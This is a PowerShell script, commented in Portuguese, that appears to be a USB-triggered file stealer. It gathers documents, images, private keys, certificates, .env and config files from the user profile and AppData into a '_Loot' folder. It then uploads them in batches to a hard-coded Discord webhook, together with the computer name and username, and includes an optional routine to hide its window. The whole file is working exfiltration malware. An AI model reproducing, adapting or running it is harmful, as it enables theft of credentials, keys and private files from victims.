<#
.SYNOPSIS
    Coleta arquivos e envia para Discord como anexos.
.NOTES
    Versao simplificada - todos os arquivos vao como anexos.
#>

$webhookUrl = "https://discord.com/api/webhooks/1505693050175885342/6LSI1HJR2XcmSAgBP2c-C5wnDhd6CHqh9vBIxIxr6l7ExhN0S2Eiyj4vEAmoL0kQlGkL"
$maxFilesPerBatch = 10
$maxFileSizeMB = 8
$maxFileSizeBytes = $maxFileSizeMB * 1MB

function Send-DiscordMessage {
    param([string]$Message, [string]$WebhookUrl)
    try {
        $body = @{ content = $Message } | ConvertTo-Json
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json'
        return $true
    } catch {
        Write-Host "Erro ao enviar mensagem: $_" -ForegroundColor Red
        return $false
    }
}

function Send-FilesToDiscord {
    param([string]$FolderPath, [string]$WebhookUrl, [int]$MaxFiles = 10, [int]$MaxSizeBytes = 8MB)
    
    # Pega todos os arquivos da pasta (limitados por tamanho)
    $files = Get-ChildItem -Path $FolderPath -File | Where-Object { $_.Length -le $MaxSizeBytes }
    if ($files.Count -eq 0) {
        Write-Host "Nenhum arquivo valido para enviar." -ForegroundColor Yellow
        return @{sent = 0; skipped = 0}
    }
    
    Write-Host "Encontrados $($files.Count) arquivos para envio." -ForegroundColor Cyan
    
    $sentCount = 0
    $skippedCount = 0
    $batchNumber = 1
    $fileIndex = 0
    
    while ($fileIndex -lt $files.Count) {
        $batch = $files | Select-Object -Skip $fileIndex -First $MaxFiles
        $fileIndex += $MaxFiles
        
        Write-Host "Preparando lote $batchNumber ($($batch.Count) arquivos)..." -ForegroundColor Magenta
        
        # Constroi a lista de arquivos com suas pastas de origem
        $fileList = @()
        foreach ($f in $batch) {
            $pastaOrigem = Split-Path $f.FullName -Parent
            $fileList += "- $($f.Name) (Origem: $pastaOrigem)"
        }
        $listaMsg = $fileList -join "`n"
        
        # Mensagem que vai junto com os anexos
        $contentMsg = "[Lote $batchNumber]`nArquivos anexados:`n$listaMsg"
        
        # Prepara o boundary para multipart
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        # Inicia o corpo da requisicao com a mensagem JSON
        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"payload_json`"$LF",
            "{`"content`": `"$contentMsg`"}"
        )
        
        # Adiciona cada arquivo como anexo
        foreach ($file in $batch) {
            try {
                $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
                $fileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
                
                $bodyLines += "--$boundary"
                $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`""
                $bodyLines += "Content-Type: application/octet-stream$LF"
                $bodyLines += $fileContent
            } catch {
                Write-Host "Erro ao ler arquivo: $($file.Name)" -ForegroundColor Red
                $skippedCount++
            }
        }
        
        $bodyLines += "--$boundary--$LF"
        $body = $bodyLines -join $LF
        
        # Envia o lote
        try {
            Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $body
            Write-Host "Lote $batchNumber enviado com $($batch.Count) anexos." -ForegroundColor Green
            $sentCount += $batch.Count - $skippedCount
            Start-Sleep -Milliseconds 500
        } catch {
            Write-Host "Erro ao enviar lote $batchNumber: $_" -ForegroundColor Red
        }
        
        $batchNumber++
        if ($fileIndex -lt $files.Count) {
            Write-Host "Aguardando 2 segundos..." -ForegroundColor Gray
            Start-Sleep -Seconds 2
        }
    }
    
    return @{ sent = $sentCount; skipped = $skippedCount; total = $files.Count }
}

function Hide-Window {
    try {
        $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
        $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
        $hwnd = (Get-Process -PID $pid).MainWindowHandle
        if ($hwnd -ne [System.IntPtr]::Zero) {
            $Type::ShowWindowAsync($hwnd, 0)
        } else {
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $Proc = Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' }
            $hwnd = $Proc.MainWindowHandle
            $Type::ShowWindowAsync($hwnd, 0)
        }
    } catch {
        Write-Host "Erro ao ocultar janela." -ForegroundColor Red
    }
}

Clear-Host

$startMsg = "[Sistema Iniciado] Data: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss') Computador: $env:COMPUTERNAME Usuario: $env:USERNAME"
$webhookOk = Send-DiscordMessage -Message $startMsg -WebhookUrl $webhookUrl

$removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
$count = $removableDrives.count
$i = 30

Write-Host "Aguardando USB..." -ForegroundColor Yellow
if ($webhookOk) {
    Send-DiscordMessage -Message "Aguardando USB..." -WebhookUrl $webhookUrl | Out-Null
}

while ($true) {
    Clear-Host
    Write-Host "Conecte um USB.. ($i segundos)" -ForegroundColor Yellow
    $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
    Start-Sleep 1
    if ($count -ne $removableDrives.count) {
        Write-Host "USB conectado!" -ForegroundColor Green
        if ($webhookOk) {
            Send-DiscordMessage -Message "USB conectado!" -WebhookUrl $webhookUrl | Out-Null
        }
        break
    }
    $i--
    if ($i -eq 0) {
        Write-Host "Tempo esgotado!" -ForegroundColor Red
        if ($webhookOk) {
            Send-DiscordMessage -Message "Timeout! Nenhum USB." -WebhookUrl $webhookUrl
        }
        Start-Sleep 2
        exit
    }
}

$drive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object -Descending | Select-Object -First 1
$driveLetter = $drive.DeviceID
Write-Host "Drive: $driveLetter/" -ForegroundColor Green

$fileExtensions = @("*.log","*.db","*.txt","*.json","*.doc","*.pdf","*.jpg","*.jpeg","*.png","*.cer","*.key","*.xls","*.xlsx","*.cfg","*.conf","*.docx","*.pptx","*.ppt","*.ppsx","*.pptm","*.potx","*.env","*.yaml","*.config","*.csv","*.forms","*.pem","*.crt","*.pkcs12","*.pfx")
$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos","$env:USERPROFILE\AppData\Local","$env:USERPROFILE\AppData\Roaming","$env:USERPROFILE\AppData\Local\Temp","$env:TEMP") | Where-Object { Test-Path $_ }

$destinationPath = "$driveLetter\$env:COMPUTERNAME`_Loot"
if (-not (Test-Path $destinationPath)) {
    New-Item -ItemType Directory -Path $destinationPath -Force | Out-Null
    Write-Host "Pasta: $destinationPath" -ForegroundColor Green
}

# Hide-Window  # Descomente se quiser ocultar

$driveIndex = 0
$collectedFiles = @()
$skippedLargeFiles = 0
$totalFilesFound = 0

Write-Host "Coletando..." -ForegroundColor Cyan
foreach ($folder in $foldersToSearch) {
    Write-Host "Pasta: $folder" -ForegroundColor Gray
    foreach ($ext in $fileExtensions) {
        try {
            $files = Get-ChildItem -Path $folder -Recurse -Filter $ext -File -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                $totalFilesFound++
                if ($file.Length -gt $maxFileSizeBytes) {
                    Write-Host "Ignorado (>8MB): $($file.Name)" -ForegroundColor Yellow
                    $skippedLargeFiles++
                    continue
                }
                $driveIndex++
                if ($driveIndex -gt 30) {
                    $driveCheck = Get-Volume -DriveLetter $driveLetter.trimEnd(":")
                    if (-not $driveCheck) {
                        Write-Host "USB desconectado!" -ForegroundColor Red
                        if ($webhookOk) {
                            Send-DiscordMessage -Message "USB desconectado!" -WebhookUrl $webhookUrl
                        }
                        exit
                    }
                    $driveIndex = 0
                }
                $destFile = Join-Path -Path $destinationPath -ChildPath $file.Name
                if (Test-Path $destFile) {
                    $base = [System.IO.Path]::GetFileNameWithoutExtension($file.Name)
                    $ext2 = [System.IO.Path]::GetExtension($file.Name)
                    $c = 1
                    do {
                        $newName = "$base`_$c$ext2"
                        $destFile = Join-Path -Path $destinationPath -ChildPath $newName
                        $c++
                    } while (Test-Path $destFile)
                }
                Copy-Item -Path $file.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
                $collectedFiles += $destFile
            }
        } catch {
            Write-Host "Erro na pasta $folder" -ForegroundColor Red
        }
    }
}

Write-Host "Total encontrado: $totalFilesFound" -ForegroundColor Cyan
Write-Host "Coletados: $($collectedFiles.Count)" -ForegroundColor Green
if ($skippedLargeFiles -gt 0) {
    Write-Host "Ignorados (>8MB): $skippedLargeFiles" -ForegroundColor Yellow
}

if ($collectedFiles.Count -gt 0) {
    Write-Host "Enviando para Discord como anexos..." -ForegroundColor Cyan
    $result = Send-FilesToDiscord -FolderPath $destinationPath -WebhookUrl $webhookUrl -MaxFiles $maxFilesPerBatch -MaxSizeBytes $maxFileSizeBytes
    
    $summaryMessage = "[Coleta Concluida] Pasta: $destinationPath Total: $totalFilesFound Coletados: $($collectedFiles.Count) Enviados: $($result.sent) Ignorados: $($result.skipped + $skippedLargeFiles) Computador: $env:COMPUTERNAME"
    Send-DiscordMessage -Message $summaryMessage -WebhookUrl $webhookUrl
    
    $endMessage = "[Sistema Finalizado] Todos os lotes enviados. Data: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
    Send-DiscordMessage -Message $endMessage -WebhookUrl $webhookUrl
} else {
    if ($webhookUrl -eq "SEU_WEBHOOK_URL_AQUI") {
        Write-Host "Webhook nao configurado." -ForegroundColor Red
        Send-DiscordMessage -Message "[Erro] Webhook nao configurado. Arquivos em: $destinationPath" -WebhookUrl $webhookUrl
    } else {
        Write-Host "Nenhum arquivo." -ForegroundColor Yellow
        Send-DiscordMessage -Message "[Nenhum Arquivo] Nenhum arquivo encontrado." -WebhookUrl $webhookUrl
    }
}

Write-Host "Finalizado!" -ForegroundColor Green
Start-Sleep 2
